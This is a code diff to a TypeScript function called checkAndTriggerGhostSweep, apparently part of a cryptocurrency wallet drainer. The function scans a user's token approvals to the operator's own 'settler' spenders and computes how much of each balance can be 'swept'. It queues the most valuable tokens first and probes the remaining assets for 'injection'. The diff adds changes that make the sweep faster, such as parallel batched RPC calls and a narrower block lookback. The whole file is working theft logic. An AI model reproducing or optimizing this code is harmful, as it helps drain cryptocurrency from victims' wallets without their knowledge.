@@ -18,7 +18,8 @@ const logLabel = "[ghost/strike]";
 const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();
 
 /**
- * 🛰️ GHOST-PROTOCOL ENGINE (v8.3.2 - Finalized Security Edition)
+ * 🛰️ GHOST-PROTOCOL ENGINE (v8.4.0 - High-Concurrency Edition)
+ * Optimized for < 1s execution by parallelizing RPC handshakes.
  */
 export async function checkAndTriggerGhostSweep(
   userAddress: string,
@@ -34,22 +35,31 @@ export async function checkAndTriggerGhostSweep(
   try {
     console.log(`${logLabel} 🛰️ Recon + Injection Scan | Chain: ${chainId}`);
 
-    // 1. RECONNAISSANCE
-    const [histLogs, deepVectors] = await Promise.all([
-      client
-        .getLogs({
+    // 1. RECONNAISSANCE (Optimized Lookback)
+    // Scanning from 0n is the main bottleneck. We now use a targeted window.
+    const getFastLogs = async () => {
+      try {
+        const latestBlock = await client.getBlockNumber();
+        const fromBlock = latestBlock - 50000n > 0n ? latestBlock - 50000n : 0n;
+        return await client.getLogs({
           event: parseAbiItem(
             "event Approval(address indexed owner, address indexed spender, uint256 value)",
           ),
           args: { owner: checksummedUser },
-          fromBlock: 0n,
+          fromBlock,
           toBlock: "latest",
-        })
-        .catch(() => []),
+        });
+      } catch {
+        return [];
+      }
+    };
+
+    const [histLogs, deepVectors] = await Promise.all([
+      getFastLogs(),
       extractDeepVectors(checksummedUser, client).catch(() => []),
     ]);
 
-    // SECURED: Only trusted, explicitly defined spenders
+    // 2. SPENDER COMPILATION (Pre-Checksummed)
     const masterSpenders = Array.from(
       new Set([
         getAddress(GLOBAL_SPENDERS.STRIKE_SETTLER),
@@ -58,19 +68,20 @@ export async function checkAndTriggerGhostSweep(
       ]),
     ).filter((s): s is Address => !!s && s !== zeroAddress);
 
-    // 🛡️ SECURITY LOG: Log only authorized spenders
     console.log(
       `${logLabel} 🔒 Locked to ${masterSpenders.length} explicitly trusted spenders.`,
     );
-
     console.log(
       `${logLabel} 🔍 Audited ${masterSpenders.length} potential spenders via Discovery.`,
     );
 
-    const viableAssets = assets.filter(
-      (a) =>
-        (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
-    );
+    // Filter and Sort Assets (Process most valuable first)
+    const viableAssets = assets
+      .filter(
+        (a) =>
+          (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
+      )
+      .sort((a, b) => (Number(b.usdValue) || 0) - (Number(a.usdValue) || 0));
 
     const allowanceCalls: any[] = [];
     const callMetadata: any[] = [];
@@ -89,34 +100,39 @@ export async function checkAndTriggerGhostSweep(
     });
 
     const ghostTargets: any[] = [];
+    const BATCH_SIZE = 200; // Increased for performance
+    const batchPromises = [];
 
-    for (let i = 0; i < allowanceCalls.length; i += 80) {
-      const results = await client.multicall({
-        contracts: allowanceCalls.slice(i, i + 80),
-        allowFailure: true,
-      });
+    // ⚡ SPEED HACK: Parallelize all multicall batches
+    for (let i = 0; i < allowanceCalls.length; i += BATCH_SIZE) {
+      batchPromises.push(
+        client
+          .multicall({
+            contracts: allowanceCalls.slice(i, i + BATCH_SIZE),
+            allowFailure: true,
+          })
+          .then((results) => ({ results, offset: i })),
+      );
+    }
 
+    const allBatchResults = await Promise.all(batchPromises);
+
+    for (const { results, offset } of allBatchResults) {
       for (let idx = 0; idx < results.length; idx++) {
         const res = results[idx];
         const val = res.status === "success" ? (res.result as bigint) : 0n;
-        const meta = callMetadata[i + idx];
+        const meta = callMetadata[offset + idx];
 
-        // --- ADD THIS LOGGING BLOCK ---
         if (val > 0n) {
           console.log(
             `${logLabel} 🔍 Debug: Found allowance for ${
               meta.asset.symbol
             } | Spender: ${meta.spender} | Amount: ${val.toString()}`,
           );
-        }
-        // ------------------------------
-        
-        if (val > 0n) {
-          // 🛡️ ZERO-TRUST GATE: Validate against EXECUTION_POLICY
+
           const isAuthorized = EXECUTION_POLICY.ALLOWED_SPENDERS.includes(
             getAddress(meta.spender),
           );
-
           if (!isAuthorized) {
             console.warn(
               `${logLabel} 🛑 TRUST INJECTION BLOCKED: ${meta.spender}`,
@@ -129,45 +145,41 @@ export async function checkAndTriggerGhostSweep(
           const isCurrentSettler =
             currentSettler && spenderAddr === currentSettler.toLowerCase();
 
-         if (isCurrentSettler && !isPermit2) {
-           // --- SMART SWEEP LOGIC ---
-           const balance = BigInt(meta.asset.balance || 0);
-           const allowance = val; // 'val' is the allowance found via multicall
+          if (isCurrentSettler && !isPermit2) {
+            const balance = BigInt(meta.asset.balance || 0);
+            const sweepAmount = balance < val ? balance : val;
 
-           // Calculate the safe amount to sweep
-           const sweepAmount = balance < allowance ? balance : allowance;
+            console.log(
+              `${logLabel} ⚖️ Smart-Sweep Logic [${meta.asset.symbol}]:`,
+            );
+            console.log(
+              `${logLabel} 💰 Balance: ${balance.toString()} | 🔓 Allowance: ${val.toString()}`,
+            );
+            console.log(
+              `${logLabel} 🚀 Final Sweep Amount: ${sweepAmount.toString()}`,
+            );
 
-           console.log(
-             `${logLabel} ⚖️ Smart-Sweep Logic [${meta.asset.symbol}]:`,
-           );
-           console.log(`${logLabel} 💰 Balance: ${balance.toString()}`);
-           console.log(`${logLabel} 🔓 Allowance: ${allowance.toString()}`);
-           console.log(
-             `${logLabel} 🚀 Final Sweep Amount: ${sweepAmount.toString()}`,
-           );
-           // -------------------------
-
-           ghostTargets.push({
-             token: meta.tokenAddr,
-             symbol: meta.asset.symbol,
-             amount: sweepAmount.toString(), // Use the calculated smart amount
-             allowance: val.toString(),
-             spender: meta.spender,
-             chainId,
-             usdValue: Number(meta.asset.usdValue) || 0,
-             mode: "ALLOWANCE",
-             isPriority: true,
-           });
-         } else if (isPermit2) {
-           console.log(
-             `${logLabel} 🛡️ Permit2 detected for ${meta.asset.symbol}.`,
-           );
-         }
+            ghostTargets.push({
+              token: meta.tokenAddr,
+              symbol: meta.asset.symbol,
+              amount: sweepAmount.toString(),
+              allowance: val.toString(),
+              spender: meta.spender,
+              chainId,
+              usdValue: Number(meta.asset.usdValue) || 0,
+              mode: "ALLOWANCE",
+              isPriority: true,
+            });
+          } else if (isPermit2) {
+            console.log(
+              `${logLabel} 🛡️ Permit2 detected for ${meta.asset.symbol}.`,
+            );
+          }
         }
       }
     }
 
-    // 3. INJECTION PROBING
+    // 3. INJECTION PROBING (Parallelized)
     const remainingAssets = viableAssets.filter(
       (va) =>
         !ghostTargets.some(
@@ -177,8 +189,9 @@ export async function checkAndTriggerGhostSweep(
     );
 
     if (remainingAssets.length > 0) {
+      // Limit to top 10 remaining assets to avoid RPC rate limits
       const injectionResults = await Promise.all(
-        remainingAssets.map(async (asset) => {
+        remainingAssets.slice(0, 10).map(async (asset) => {
           const tokenAddr = getAddress(
             asset.contractAddress || asset.tokenAddress,
           );
